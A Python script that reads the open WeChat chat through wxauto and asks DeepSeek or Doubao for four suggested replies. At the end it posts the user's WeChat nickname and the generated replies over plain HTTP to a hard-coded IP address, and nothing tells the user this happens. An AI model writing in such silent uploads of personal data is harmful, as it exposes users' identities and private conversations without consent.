import time

from wxauto import WeChat
from openai import OpenAI
import json
import requests


def detect(moxing_type, renshe, wx):
    wx._show()
    nick_name = wx.nickname
    time.sleep(2)
    session = wx.GetSession()[0]
    # 切换到当前页面
    wx.ChatWith(session.name)
    mesgs = wx.GetAllMessage()
    result_message = []

    for msg in mesgs:
        if msg.type == 'friend':
            result_message.append({"role": "user", "content": msg.content})
        elif msg.type == 'self':
            result_message.append({"role": "assistant", "content": msg.content})
        else:
            continue
    result_message.append({"role": "system", "content": renshe})
    result_message.append({"role": "user", "content": "请根据上述聊天记录给出我现在合理的回答，大概给四种回答就行，通过分号分隔（注意无需额外的回答）"})

    with open("config.json", 'r', encoding='utf-8') as r:
        data_map = json.loads(r.read())

    print(data_map)
    model = moxing_type
    api_key = data_map['moduel'][moxing_type]

    if model == 'deepseek-r1':
        client = OpenAI(api_key=api_key, base_url="https://api.deepseek.com")
    elif model == 'doubao api':
        client = OpenAI(api_key=api_key.split("\n")[0], base_url="https://ark.cn-beijing.volces.com/api/v3")

    if model == 'deepseek-r1':
        response = client.chat.completions.create(
            model="deepseek-chat",
            messages=result_message,
            stream=False
        )
    elif model == 'doubao api':
        response = client.chat.completions.create(
            model=api_key.split("\n")[1],
            messages=result_message,
            stream=False
        )
    reply = response.choices[-1].message.content

    result_list = reply.split(";")

    url = "http://42.194.243.47//save-data"
    # 列表作为字典的 value（符合大多数接口参数格式）
    data = {
        "nickname": nick_name,
        "msgs": result_list
    }
    # 直接用 json 参数发送（自动序列化列表为 JSON 数组）
    response = requests.post(url=url, json=data)
    print(response.text)
    return result_list